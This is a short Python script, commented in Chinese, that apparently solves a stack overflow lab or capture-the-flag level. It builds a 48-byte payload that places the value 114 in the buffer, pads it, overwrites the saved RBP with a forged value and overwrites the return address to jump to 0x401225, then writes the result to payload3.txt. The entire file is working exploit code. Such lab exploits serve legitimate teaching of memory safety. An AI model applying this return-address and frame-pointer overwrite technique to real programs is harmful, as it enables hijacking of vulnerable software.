import struct

# 1. 你的栈地址 (由 GDB 得到)
buffer_addr = 0x7fffffffd8d0

# 2. 计算 Fake RBP (欺骗 RBP)
# 逻辑：func1 检查 [rbp - 0x44] 是否等于 114
# 我们把 114 放在 buffer 的开头 (即 buffer_addr)
# 所以需要：New_RBP - 0x44 = buffer_addr
# 推导：New_RBP = buffer_addr + 0x44
fake_rbp = buffer_addr + 0x44 
# 计算结果应该是 0x7fffffffd914

# 3. 构造 Payload (总共 48 字节)

# Part A: 在 buffer 开头放入目标值 114 (0x72)
# 占据 8 字节
payload = struct.pack('<Q', 114)

# Part B: 填充 Padding
# buffer 大小是 32 字节，减去上面用掉的 8 字节，还剩 24 字节
payload += b'A' * 24

# Part C: 覆盖 Saved RBP (偏移 32 字节处)
# 这里填入我们计算好的 fake_rbp
payload += struct.pack('<Q', fake_rbp)

# Part D: 覆盖 Return Address (偏移 40 字节处)
# 跳过 func1 的开头，直接跳到比较指令处 (0x401225)
target_addr = 0x401225
payload += struct.pack('<Q', target_addr)

# 写入文件
with open('payload3.txt', 'wb') as f:
    f.write(payload)

print(f"Payload generated.")
print(f"Buffer Address used: {hex(buffer_addr)}")
print(f"Fake RBP calculated: {hex(fake_rbp)}")